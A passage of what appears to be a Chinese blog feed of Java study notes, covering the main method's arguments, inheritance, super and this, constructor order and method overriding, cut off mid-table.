<h1 id="深入理解Main方法"><a href="#深入理解Main方法" class="headerlink" title="深入理解Main方法"></a>深入理解Main方法</h1><h2 id="语法说明："><a href="#语法说明：" class="headerlink" title="语法说明："></a>语法说明：</h2><p>main方法形式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>1、main方法是JVM调用的</li>
<li>2、Java虚拟机需要调用类的main（）方法，所以该方法的访问权限必须是public</li>
<li>3、Java虚拟机在执行main（）方法时不必创建对象，所以该方法必须是static</li>
<li>4、该方法接受String类型的数组参数，该数组中保存执行java命令时传递给所运行的类的参数</li>
</ul>
<p>String[] args这个字符串数组里面的形参到底是什么时候传进去的？是在执行下面程序（第5点）的时候传入的：</p>
<ul>
<li>5、Java执行的程序 参数1 参数2 参数3</li>
</ul>
<p><img src="https://picgooo.oss-cn-hangzhou.aliyuncs.com/img/%E6%88%AA%E5%B1%8F2022-09-14%2019.43.35.png" alt="截屏2022-09-14 19.43.35"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; args.length ; i++)&#123;</span><br><span class="line">				System.out.println(<span class="string">&quot;第&quot;</span>+ (i+<span class="number">1</span>) + <span class="string">&quot;个参数=&quot;</span> + args[i]);</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们都知道，编写了上述代码后，需要：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac Hello.java</span><br><span class="line"></span><br><span class="line">java Hello</span><br></pre></td></tr></table></figure>

<p>才可以执行，这个时候我们可以看到终端输出为空，但是如果将运行代码修改成下面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java Hello tom jack smith</span><br></pre></td></tr></table></figure>

<p>我们就可以看到输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第1个参数=tom</span><br><span class="line">第2个参数=jack</span><br><span class="line">第3个参数=smith</span><br></pre></td></tr></table></figure>

<h2 id="特别说明："><a href="#特别说明：" class="headerlink" title="特别说明："></a>特别说明：</h2><ul>
<li>1、在main()方法中，我们可以调用main方法所在类的静态方法或静态属性</li>
<li>2、但是，不能直接访问该类中的非静态成员，必须创建一个实例对象后，才能通过这个对象去访问类中的非静态成员。</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习笔记(五)——继承</title>
    <url>/2022/09/14/22-Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)%E2%80%94%E2%80%94%E7%BB%A7%E6%89%BF/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>该部分为面向对象编程（中级部分）中：继承部分的知识</p>
<h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="为什么需要继承？"><a href="#为什么需要继承？" class="headerlink" title="为什么需要继承？"></a>为什么需要继承？</h2><p>继承可以解决<span style='color:orange'>代码复用</span>，让我们的编程更加接近人类思维。当多个类存在相同的属性（变量）和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的字类不需要重新定义这些属性和方法，只需要通过extends来声明继承父类即可。</p>
<ul>
<li>代码的复用性提高</li>
<li>代码的扩展性和维护性提高</li>
</ul>
<h2 id="继承的基本语法"><a href="#继承的基本语法" class="headerlink" title="继承的基本语法"></a>继承的基本语法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">class 子类 extends 父类&#123;</span><br><span class="line">	<span class="number">1</span>）子类就会自动拥有父类定义的属性和方法</span><br><span class="line">	<span class="number">2</span>）父类又叫超类、基类</span><br><span class="line">	<span class="number">3</span>）子类又叫派生类</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="继承的细节"><a href="#继承的细节" class="headerlink" title="继承的细节"></a>继承的细节</h2><ul>
<li>1、子类继承了所有的属性和方法，<span style='color:orange'>非私有的属性和方法可以在子类直接访问</span>，但是<span style='color:orange'>私有属性和方法</span>不能在子类<span style='color:orange'>直接访问</span>直接访问，要通过<span style='color:orange'>父类提供的公共方法</span>去访问。（注意，如果是默认的属性和方法，如果在同包下也可访问，具体可以看访问修饰符的范围表）</li>
<li>2、子类必须调用父类的构造器，完成父类的初始化。</li>
</ul>
<span id="more"></span>

<p>​	也就是说，当子类在创建对象的时候，会默认调用父类的无参构造器。这是因为子类的无参构造器中会隐藏一个super动作：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sub</span> <span class="keyword">extends</span> <span class="title class_">Base</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Sub</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="built_in">super</span>();<span class="comment">//默认隐藏，默认调用父类的无参构造器</span></span><br><span class="line">		System.out.println(<span class="string">&quot;子类sub()构造器被调用...&quot;</span>)；</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>3、当创建子类对象时，<span style='color:red'>不管使用子类的哪个构造器，默认情况下总会去调用父类的无参构造器</span>，如果父类没有提供无参构造器，则必须在子类的<span style='color:red'>每一个构造器中</span>都用super去指定父类的哪个构造器完成对父类的初始化工作，否则编译不会通过。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Base</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">  <span class="keyword">public</span> String name;</span><br><span class="line"> <span class="comment">//父类构造器</span></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Base</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;<span class="comment">//有参构造器，这里写了有参构造器，默认的无参构造器就会被覆盖，也就是不存在无参构造器了</span></span><br><span class="line">    System.out.println(<span class="string">&quot;父类Base(String name, int age)构造器被调用&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sub</span> <span class="keyword">extends</span> <span class="title class_">Base</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Sub</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">super</span>(<span class="string">&quot;Smith&quot;</span>,<span class="number">10</span>);<span class="comment">//这里必须指定一个super</span></span><br><span class="line">    System.out.println(<span class="string">&quot;子类sub()构造器被调用&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Sub</span><span class="params">(String name)</span>&#123;</span><br><span class="line">    <span class="built_in">super</span>(<span class="string">&quot;Tom&quot;</span>,<span class="number">30</span>);<span class="comment">//这里必须指定一个super</span></span><br><span class="line">    System.out.println(<span class="string">&quot;子类Sub(String name)构造器被调用&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExtendsDetail</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">Sub</span> <span class="variable">sub</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Sub</span>();<span class="comment">//创建了子类对象sub</span></span><br><span class="line">    System.out.println(<span class="string">&quot;===第二个对象===&quot;</span>);</span><br><span class="line">    <span class="type">Sub</span> <span class="variable">sub2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Sub</span>(<span class="string">&quot;Jack&quot;</span>);创建了第二个子类对象sub2</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>4、如果希望指定去调用父类的某个构造器，则显示的调用一下：super(参数列表)</li>
<li>5、super在使用时，<span style='color:red'>只能在构造器中使用</span>，且必须放在<span style='color:red'>构造器的第一行 </span>。（因为必须先有父类，才有子类）</li>
<li>6、super()和this()都只能放在构造器的第一行，因此<span style='color:red'>这两个方法不能共存在一个构造器中。</span>注意，这里this调用指的是不能用this来调用其他构造器，以下情况是可以的：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Pc</span><span class="params">(String cpu,<span class="type">int</span> memory,<span class="type">int</span> disk,String brand)</span>&#123;</span><br><span class="line">	<span class="built_in">super</span>(cpu,memory,disk);<span class="comment">//父类的构造器完成父类属性的初始化</span></span><br><span class="line">	<span class="built_in">this</span>.brand = brand;<span class="comment">//子类构造器完成子类属性的初始化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里也体现了：继承涉及的基本思想，父类的构造器完成父类属性的初始化，子类构造器完成子类属性的初始化。</p>
<ul>
<li>7、Java所有类都是Object的子类，<span style='color:red'>Object是所有类的基类</span>。</li>
<li>8、父类构造器的调用不限于直接父类！将一直往上追溯直到Object类（顶级父类）。</li>
<li>9、子类最多只能继承一个父类（指直接继承），即<span style='color:red'>Java中是单继承机制</span>。</li>
</ul>
<p>​	思考如何让A类继承B类和C类？——让B类继承C类。</p>
<ul>
<li>10、不能滥用继承，子类和父类之间必须满足is-a的逻辑关系。</li>
</ul>
<h2 id="继承的本质"><a href="#继承的本质" class="headerlink" title="继承的本质"></a><span style='color:red'>继承的本质</span></h2><p>当子类继承父类，创建子类对象的时候，内存中到底发生了什么？——当子类对象创建好后，建立<span style='color:red'>查找的关系</span>。</p>
<p>构造过程：</p>
<p><img src="https://picgooo.oss-cn-hangzhou.aliyuncs.com/img/%E6%88%AA%E5%B1%8F2022-08-24%2017.00.14-20220914163803365.png" alt="截屏2022-08-24 17.00.14"></p>
<ul>
<li>1、先根据继承关系加载我们的类，顺序从顶级父类到子类</li>
<li>2、加载完后会堆里面分配空间</li>
<li>3、如果有字符串则会指向常量池的某一个地址，基础数据类型直接存放在堆中</li>
<li>4、把son在堆中的地址返回给主方法的对象引用</li>
</ul>
<p>访问过程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.extend_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.stream.StreamSource;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExtendsTheory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Son</span> <span class="variable">son</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>();<span class="comment">//内存的布局？</span></span><br><span class="line">        <span class="comment">//-&gt;需要按照查找关系来返回信息</span></span><br><span class="line">        <span class="comment">//（1）首先看子类是否有该属性</span></span><br><span class="line">        <span class="comment">//（2）如果子类有这个属性，并且可以访问，则返回信息</span></span><br><span class="line">        <span class="comment">//（3）如果子类没有这个属性，就看父类有没有这个属性（如果父类有该属性，并且可以访问，则返回信息）</span></span><br><span class="line">        <span class="comment">//（4）如果父类没有，就按照（3）的规则（就近原则）继续找上一级父类，知道Object...</span></span><br><span class="line">        System.out.println(son.name);<span class="comment">//返回就是儿子</span></span><br><span class="line">        System.out.println(son.age);<span class="comment">//子类虽然没有，但父类有-&gt;30</span></span><br><span class="line">        System.out.println(son.hobby);<span class="comment">//子类和父类虽然没有，但父类的父类有，可以访问</span></span><br><span class="line">        <span class="comment">//System.out.println(son.salary);//能返回薪水吗？不可以，因为子类不能访问private类型的属性</span></span><br><span class="line">        <span class="comment">//这里有个问题：salary属性是private的，那么在new一个son的对象之后，在内存里面到底有没有这个salary呢？</span></span><br><span class="line">        <span class="comment">//当然有，但不能直接访问，只能让father提供一个公共的方法来访问</span></span><br><span class="line">        System.out.println(son.getSalary());</span><br><span class="line">        <span class="comment">//相应还有一个问题：GrandPa类里面有一个salary是public类型的，父类中的salary是private类型的，那么son中能否直接访问salary呢？</span></span><br><span class="line">        <span class="comment">//答案是不可以！因为son在往上找的时候，在father里面已经找到了salary，但是这个salary无法访问，所以直接报错，而不会再去上一级查看是否有</span></span><br><span class="line">        <span class="comment">//如果有一级被堵住了，直接结束。总结：不能跨级查找。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GrandPa</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;爷爷&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">hobby</span> <span class="operator">=</span> <span class="string">&quot;旅游&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span> <span class="keyword">extends</span> <span class="title class_">GrandPa</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;爸爸&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">salary</span> <span class="operator">=</span> <span class="number">40000</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getSalary</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Father</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;儿子&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="练习例子"><a href="#练习例子" class="headerlink" title="练习例子"></a>练习例子</h2><p>下面代码输出为何？</p>
<h3 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.extend_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.SQLSyntaxErrorException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Extends02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">B</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;a name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">B</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>(<span class="string">&quot;abc&quot;</span>);<span class="comment">//由于有了this，默认的super被覆盖，先调用B(String name)构造器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">B</span><span class="params">(String name)</span>&#123;<span class="comment">//默认有一个super()，调用父类的无参构造器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;b name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a</span><br><span class="line">b name</span><br><span class="line">b</span><br></pre></td></tr></table></figure>

<h3 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.extend_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Extends03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">C</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是A类&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">B</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是B类的无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">B</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;我是B类的有参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">extends</span> <span class="title class_">B</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">C</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;我是C类的无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">C</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;hahaha&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;我是C类的有参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我是A类</span><br><span class="line">hahaha我是B类的有参构造</span><br><span class="line">我是C类的有参构造</span><br><span class="line">我是C类的无参构造</span><br></pre></td></tr></table></figure>

<h2 id="super的基本语法"><a href="#super的基本语法" class="headerlink" title="super的基本语法"></a>super的基本语法</h2><ul>
<li><p>1、访问父类的属性，但不能访问父类的private属性 【案例】super.属性名 </p>
</li>
<li><p>2、访问父类的方法，但不能访问父类的private方法【案例】super.方法名（参数列表）</p>
</li>
<li><p>3、访问父类的构造器：super（参数列表）；只能放在构造器的第一句，且只能出现一句。</p>
</li>
</ul>
<h2 id="super的使用细节"><a href="#super的使用细节" class="headerlink" title="super的使用细节"></a>super的使用细节</h2><p>super给编程带来的便利：</p>
<ul>
<li>1、调用父类的构造器的好处（分工明确，父类属性由父类初始化，子类属性由子类初始化）</li>
<li>2、当子类中有和父类中成员（属性和方法）重名时，为了访问父类的成员，必须通过super。如果没有重名，使用super、this、直接访问是一样的效果。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">	<span class="comment">//4个属性</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="variable">n1</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">	<span class="keyword">protected</span> <span class="type">int</span> <span class="variable">n2</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line">	<span class="type">int</span> <span class="variable">n3</span> <span class="operator">=</span> <span class="number">300</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> <span class="variable">n4</span> <span class="operator">=</span> <span class="number">400</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">A</span><span class="params">(String name)</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">A</span><span class="params">(String name , <span class="type">int</span> age)</span>&#123;&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;A类的cal()方法...&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test100</span><span class="params">()</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">test200</span><span class="params">()</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">void</span> test <span class="number">300</span>()&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">test400</span><span class="params">()</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sum</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;B类的sum()&quot;</span>)；</span><br><span class="line">		<span class="comment">//这里希望调用父类-A 的cal方法</span></span><br><span class="line">		<span class="comment">//这时，因为子类B没有cal方法，因此我可以使用下面三种方式</span></span><br><span class="line">		<span class="comment">//找cal方法时，顺序是：</span></span><br><span class="line">    <span class="comment">//（1）先找本类，如果有，则调用</span></span><br><span class="line">    <span class="comment">//（2）如果没有则找父类（如果有，并可以调用，则调用）</span></span><br><span class="line">		<span class="comment">//（3）如果父类没有，则继续找父类的父类，规则一样，直到object</span></span><br><span class="line">    <span class="comment">//提示：如果查找方法的过程中，找到了，但是不能访问，则报错</span></span><br><span class="line">    <span class="comment">//		 如果查找方法的过程中，没有找到，则提示方法不存在</span></span><br><span class="line">		cal();</span><br><span class="line">		<span class="built_in">this</span>.cal();<span class="comment">//等价cal()</span></span><br><span class="line">    <span class="built_in">super</span>.cal();<span class="comment">//没有查找被类的过程，直接进入到第（2）步，直接找父类，但其他规则是一样的</span></span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果本类有cal()函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cal</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;B类的cal()&quot;</span>)；</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sum</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;B类的sum()&quot;</span>)；</span><br><span class="line">		<span class="comment">//这里希望调用父类-A 的cal方法</span></span><br><span class="line">		<span class="comment">//这时，因为子类B没有cal方法，因此我可以使用下面三种方式</span></span><br><span class="line">		<span class="comment">//找cal方法时，顺序是：</span></span><br><span class="line">    <span class="comment">//（1）先找本类，如果有，则调用</span></span><br><span class="line">    <span class="comment">//（2）如果没有则找父类（如果有，并可以调用，则调用）</span></span><br><span class="line">		<span class="comment">//（3）如果父类没有，则继续找父类的父类，规则一样，直到object</span></span><br><span class="line">    <span class="comment">//提示：如果查找方法的过程中，找到了，但是不能访问，则报错</span></span><br><span class="line">    <span class="comment">//		 如果查找方法的过程中，没有找到，则提示方法不存在</span></span><br><span class="line">		cal();<span class="comment">//走的是本类的</span></span><br><span class="line">		<span class="built_in">this</span>.cal();<span class="comment">//等价cal()</span></span><br><span class="line">    <span class="built_in">super</span>.cal();<span class="comment">//走的是A的cal()</span></span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>3、super的访问不限于直接父类，如果爷爷类和本类中有同名的成员，也可以使用super去访问爷爷类的成员；如果多个基类中都有同名的成员，使用super访问遵循就近原则。当然也需要遵守访问权限的相关规则。</li>
</ul>
<h2 id="super和this的比较"><a href="#super和this的比较" class="headerlink" title="super和this的比较"></a>super和this的比较</h2><table>
<thead>
<tr>
<th align="center">no.</th>
<th align="center">区别点</th>
<th align="center">this</th>
<th align="center">super</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">访问属性</td>
<td align="center">访问本类中的属性，如果本类中没有此属性则从父类中继续查找</td>
<td align="center">从父类开始查找属性</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">调用方法</td>
<td align="center">访问本类中的方法，如果本类中没有此方法则从父类中继续查找</td>
<td align="center">从父类开始查找方法</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">调用构造器</td>
<td align="center">调用本类构造器，必须放在构造器的首行</td>
<td align="center">调用父类构造器，必须放在构造器的首行</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">特殊</td>
<td align="center">表示当前对象</td>
<td align="center">子类中访问父类对象</td>
</tr>
</tbody></table>
<h2 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h2><p>方法覆盖（重写）就是子类有一个方法，和父类的某个方法的名称、返回类型、参数一样，那么我们就说子类的这个方法覆盖了父类的那个方法。</p>
<h3 id="方法重写的细节"><a href="#方法重写的细节" class="headerlink" title="方法重写的细节"></a>方法重写的细节</h3><p>方法重写也叫方法覆盖，需要满足以下条件：</p>
<ul>
<li>1、子类的方法的参数、方法名称，要和父类方法完全一样。</li>
<li>2、子类方法的返回类型和父类方法返回类型一样，或者是父类返回类型的子类（反过来不行）。比如父类返回类型是Object，子类方法返回类型是String，例如以下两个也是重写：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//父类方法</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getInfo</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"><span class="comment">//子类方法：</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>3、子类方法不能缩小父类方法的访问权限。意思就是</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//父类方法：</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">sayok</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"><span class="comment">//子类方法：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayok</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//可行，因为访问权限：public &gt; protected &gt; 默认 &gt; private</span></span><br></pre></td></tr></table></figure>

<p>这里的主要原因依赖于：<span style='color:orange'>里氏代换原则</span></p>
<blockquote>
<p>里氏代换原则(Liskov Substitution Principle LSP)面向对象设计的基本原则之一。 里氏代换原则中说，<span style='color:orange'>任何基类可以出现的地方，子类一定可以出现</span>。 LSP是继承复用的基石，只有当衍生类可以替换掉基类，软件单位的功能不受到影响时，基类才能真正被复用，而衍生类也能够在基类的基础上增加新的行为。里氏代换原则是对“开-闭”原则的补充。实现“开-闭”原则的关键步骤就是抽象化。而基类与子类的继承关系就是抽象化的具体实现，所以里氏代换原则是对实现抽象化的具体步骤的规范。</p>
<p>把里氏代换原则解释得更完整一些：在一个软件系统中，子类应该可以替换任何基类能够出现的地方，并且经过替换以后，代码还能正常工作。</p>
</blockquote>
<h3 id="方法重写和重载区别"><a href="#方法重写和重载区别" class="headerlink" title="方法重写和重载区别"></a>方法重写和重载区别</h3><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">发生范围</th>
<th align="center">方法名</th>
<th align="center">形参列表</th>
<th align="center">返回类型</th>
<th align="center">修饰符</th>
</tr>
</thead>
<tbody><tr>
<td align="center">重载（overload）</td>
